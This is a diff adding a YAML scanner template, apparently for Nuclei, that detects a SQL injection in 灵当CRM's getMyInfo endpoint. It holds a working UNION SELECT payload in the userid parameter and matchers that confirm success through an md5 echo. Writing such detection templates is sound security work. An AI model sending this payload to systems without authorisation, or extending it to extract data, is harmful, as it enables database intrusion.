@@ -1,0 +1,29 @@
+id: poc-yaml-51mis-crm-getmyinfo-userid-sqli
+info:
+  name: 灵当CRM getMyInfo userid SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    灵当CRM存在SQL注入漏洞，可通过特定的参数触发，导致敏感信息泄露。
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        GET /crm/WeiXinApp/marketing/index.php?module=Users&action=getMyInfo&userid=1+UNION+ALL+SELECT+md5({{t1}}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"avatar\""
+          - "{{t2}}"
+      - type: word
+        negative: true
+        words:
+          - "<"
